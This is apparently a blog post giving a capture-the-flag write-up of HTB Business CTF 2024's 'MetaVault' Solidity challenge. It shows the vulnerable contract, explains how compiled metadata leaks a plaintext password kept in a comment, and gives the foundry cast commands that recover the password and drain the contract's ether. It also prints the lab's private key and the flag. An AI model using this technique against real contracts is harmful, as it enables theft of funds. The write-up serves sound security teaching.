@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Difficulty : easy
+Source files
+The Ministry of Defense released the open source of &ldquo;MetaVault&rdquo;, the country&rsquo;s Ethereum reserves. It&rsquo;s said that they keeps secrets in a meta-location, so that no one can know them.
+Introduction The challenge introduces to the use of meta-data in a solidity contract
+To validate we need to steal all ether of the target contract.
+Recon TL;DR So for i solving i just have to :">  
+
+  <title>
+    
+      HTB Business CTF 2024 - MetaVault [web3] 
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.1ef396af424779a556732025dd81d6d6e7598915f2e9367bbed396f28fdb66039e8ac040e562a0e1f82f370a01deb2c6a9584ec8d76aed662830e68b2becaf06.css" integrity="sha512-HvOWr0JHeaVWcyAl3YHW1udZiRXy6TZ7vtOW8o/bZgOeisBA5WKg4fgvNwoB3rLGqVhOyNdq7WYoMOaLK&#43;yvBg==" />
+  
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">../</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2024-05-31 20:43:04 &#43;0200 CEST">
+            2024-05-31
+        </time>
+    </p>
+
+    <h1>HTB Business CTF 2024 - MetaVault [web3] </h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#code">Code</a></li>
+    <li><a href="#interacting-with-the-instance">Interacting with the instance</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#casting-spells">Casting spells</a>
+      <ul>
+        <li><a href="#environment-variables">environment variables</a></li>
+        <li><a href="#foundrytoml">foundry.toml</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <blockquote>
+<p>Difficulty : easy</p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/hackthebox/business-ctf-2024/tree/main/blockchain/MetaVault%20%5BEasy%5D">Source files</a></p>
+</blockquote>
+<blockquote>
+<p>The Ministry of Defense released the open source of &ldquo;MetaVault&rdquo;, the country&rsquo;s Ethereum reserves. It&rsquo;s said that they keeps secrets in a meta-location, so that no one can know them.</p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>The challenge introduces to the use of meta-data in a solidity contract</p>
+<p>To validate we need to steal all ether of the target contract.</p>
+<h1 id="recon">Recon</h1>
+<h2 id="tldr">TL;DR</h2>
+<p>So for i solving i just have to :</p>
+<ul>
+<li>Get the bytecode of the contract</li>
+<li>Send it to <a href="https://playground.sourcify.dev/">https://playground.sourcify.dev/</a></li>
+<li>Get the plaintext password</li>
+<li>Interact with target and get my ethers</li>
+</ul>
+<h2 id="code">Code</h2>
+<p>MetaVault.sol</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MoD-Internal-v1.0
+pragma solidity 0.8.25;
+
+/**
+ * @title MetaVault
+ * @author Ministry of Defense
+ * @notice MoD (Ministry of Defense) Smart Contract storing the country's ETH reserves.
+ */
+contract MetaVault {
+    /**
+     * @notice Keccak256 hashed secret passphrase to enable emergency mode.
+     * @dev plaintext secret: WeLoveNukaCola!!MoD-2024 
+     * @dev The secret will be stripped before open sourcing the code. Comments are not compiled anyway.
+     */ 
+    bytes32 constant private VAULT_SECRET_K256 = 0x42c10591ced4987005f70d29b498348ecc8ab18dd28c5b93db931375ca826b5e; 
+    
+    event Deposit(
+        address indexed _from,
+        uint256 indexed _value,
+        uint256 indexed _updatedBalance
+    );
+    event FailedLoginAttempt(
+        address indexed _from,
+        string  indexed _attempt,
+        bytes32 indexed _hashedAttempt
+    );
+    event EmergencyMode(
+        address indexed _by,
+        address indexed _fundsDestination
+    ); 
+
+    /**
+     * @dev Retrieves the current ETH balance of the vault.
+     * @return balance of the vault in wei.
+     */
+    function getVaultBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    /**
+     * @notice Deposit function to receive ETH deposits.
+     * @dev emits a Deposit event with the depositor, the value deposited and the updated balance after deposit.
+     */
+    function deposit() public payable {
+        emit Deposit(
+            msg.sender,
+            msg.value,
+            getVaultBalance()
+        );        
+    }
+
+    /**
+     * @notice Function to fire the emergency mode by selfdestructing the contract and transfering the funds away.
+     * @param _secret The secret passphrase required to activate emergency mode.
+     * @dev The secret is shared only to MoD devs.
+     */
+    function emergency(string memory _secret) external {
+        bytes32 attempt_k256 = keccak256(bytes(_secret));
+        if (attempt_k256 == VAULT_SECRET_K256) {
+            emit EmergencyMode(msg.sender, msg.sender);
+            selfdestruct(payable(msg.sender));
+        } else {
+            emit FailedLoginAttempt(msg.sender, _secret, attempt_k256);
+        }
+    }
+}
+</code></pre>
+<p>Looking at the source code of <code>MetaVault.sol</code> we can notice</p>
+<ul>
+<li>A function <code>deposit()</code> allowing us to deposit ether on the contract</li>
+<li>A function <code>getVaultBalance()</code> to return balance of the vault in wei</li>
+<li>An intersting function <code>emergency(string memory _secret)</code> which will send all the ether of the vault if we find the correct password.</li>
+<li>And also many comments in the <a href="https://docs.soliditylang.org/en/latest/natspec-format.html">NatSpec</a> format.</li>
+</ul>
+<p>Reading comments, we understand that the password for <code>emergency</code> was stored in plaintext. But the devs affirms that <code>comments are not compiled</code>:</p>
+<pre><code class="language-solidity">* @dev plaintext secret: [REDACTED]
+* @dev The secret will be stripped before open sourcing the code. Comments are not compiled anyway.     
+</code></pre>
+<p>Luckily for us, reading this <a href="https://playground.sourcify.dev/">page</a> (which i find by googling <code>solidity meta-data lookup</code> and reading <a href="https://docs.sourcify.dev/docs/metadata/">https://docs.sourcify.dev/docs/metadata/</a>) we can understand that they actually are. We just have to supply the contract bytecode (the source code but <a href="https://blog.chain.link/what-are-abi-and-bytecode-in-solidity/">translated</a>.</p>
+<h2 id="interacting-with-the-instance">Interacting with the instance</h2>
+<p>Launching the instance i got 3 ips, one for the rpc endpoint, one which is the webpage of MetaSafe (the name of the vault for the scenario) and one IP to manage the instance an get the flag.</p>
+<p>I contact the last IP with nc <code>nc 94.237.61.244 38186</code> and request the information for the challenge:</p>
+<pre><code>1 - Connection information
+2 - Restart Instance
+3 - Get flag
+action? 1
+
+Private key     :  0x0a5c3d2e7717a2f9292d5f13084352a800cad51eb923b169184b22f9863ad554
+Address         :  0xF7b5424a61fFD3Afa8B2a1350d94Ff06D1f13eF7
+Target contract :  0x03d65b9e5740f7a8b8c9aAfAc74fB26Ff2328eC4
+Setup contract  :  0x6224fF48Af65663fB8b10CF830ECAC6F75B674f6
+
+</code></pre>
+<p>So now i got my address, my private key and the target address.</p>
+<h1 id="solve">Solve</h1>
+<h2 id="casting-spells">Casting spells</h2>
+<p>We will use foundry to solve and it&rsquo;s <strong>EXTREMELY</strong> useful <strong>cast</strong> command. Here is the doc: <a href="https://book.getfoundry.sh/reference/cli/cast.html">https://book.getfoundry.sh/reference/cli/cast.html</a>.</p>
+<p>With cast we can do everything we need: publishing a transaction, calling functions of contract WITHOUT publishing a transaction, doing data conversions, getting informations of blocs, getting transaction informations or even <strong>getting the bytecode of a contract</strong>.</p>
+<p>Let&rsquo;s setup our envrionement:</p>
+<p>With foundry installed installed ( i use a debian VM for the challenges ), we will set up environment variable to make everything prettier and easier.</p>
+<h3 id="environment-variables">environment variables</h3>
+<p>create a <code>.env</code> (or whatever you want to call it) file with this content:</p>
+<pre><code>PRIVATE_KEY=0x0a5c3d2e7717a2f9292d5f13084352a800cad51eb923b169184b22f9863ad554
+RPC_URL=http://94.237.61.244:38424/
+TARGET=0x03d65b9e5740f7a8b8c9aAfAc74fB26Ff2328eC4
+ATTACKER=0xF7b5424a61fFD3Afa8B2a1350d94Ff06D1f13eF7
+</code></pre>
+<p>And then execute : <code>source .env</code> to have all our variable set</p>
+<blockquote>
+<p>Notice that they will be set for the shell where you executed the command only.</p>
+</blockquote>
+<h3 id="foundrytoml">foundry.toml</h3>
+<p>In the challenge files we got a foundry.toml</p>
+<p>We will only append the RPC endpoint url at the end of it:</p>
+<pre><code>[rpc_endpoints]
+
+sepolia = &quot;http://94.237.61.244:38424&quot;
+</code></pre>
+<p>Now we are ready to exploit.</p>
+<ol>
+<li>Let&rsquo;s get first the bytecode of the target contract with the <code>cast code</code> function:</li>
+</ol>
+<p><code>cast code -r $RPC_URL $TARGET</code></p>
+<blockquote>
+<p>We will need to copy the result of it.</p>
+</blockquote>
+<ol start="2">
+<li>Paste the bytecode in <a href="https://playground.sourcify.dev/">https://playground.sourcify.dev/</a></li>
+</ol>
+<blockquote>
+<p>The result will output a json similar to this one <a href="https://ipfs.io/ipfs/QmX9L9Q9QkM3ytQ1Wk3jKAqNDXYhK8RFQHcfq8QXyfffkN">https://ipfs.io/ipfs/QmX9L9Q9QkM3ytQ1Wk3jKAqNDXYhK8RFQHcfq8QXyfffkN</a></p>
+</blockquote>
+<ol start="3">
+<li>
+<p>Copy the vault password in the json: <code>WeLoveNukaCola!!MoD-2024</code></p>
+</li>
+<li>
+<p>Interact with the <code>emercgency</code> command in the contract with the recovered password</p>
+</li>
+</ol>
+<p><code>cast send $TARGET -r $RPC_URL -f $ATTACKER --private-key $PRIVATE_KEY  &quot;emergency(string)&quot; 'WeLoveNukaCola!!MoD-2024'</code></p>
+<ol start="5">
+<li>Get the flag by contacting the instace management IP</li>
+</ol>
+<p><code>HTB{wh0_tf_sh4r3s_s3cr3ts_1n_th3_c0mm3nts}</code></p>
+<h1 id="ressources">Ressources</h1>
+<p><a href="https://book.getfoundry.sh/reference/cast/cast-send">https://book.getfoundry.sh/reference/cast/cast-send</a></p>
+<p><a href="https://docs.soliditylang.org/en/latest/cheatsheet.html">https://docs.soliditylang.org/en/latest/cheatsheet.html</a></p>
+<p><a href="https://docs.soliditylang.org/en/latest/natspec-format.html">https://docs.soliditylang.org/en/latest/natspec-format.html</a></p>
+<p><a href="https://playground.sourcify.dev/">https://playground.sourcify.dev/</a></p>
+<p><a href="https://docs.sourcify.dev/docs/metadata/">https://docs.sourcify.dev/docs/metadata/</a></p>
+<p><a href="https://blog.chain.link/what-are-abi-and-bytecode-in-solidity/">https://blog.chain.link/what-are-abi-and-bytecode-in-solidity/</a></p>
+
+</article>
+
+            </div>
+        </main>
+    </body>
+</html>
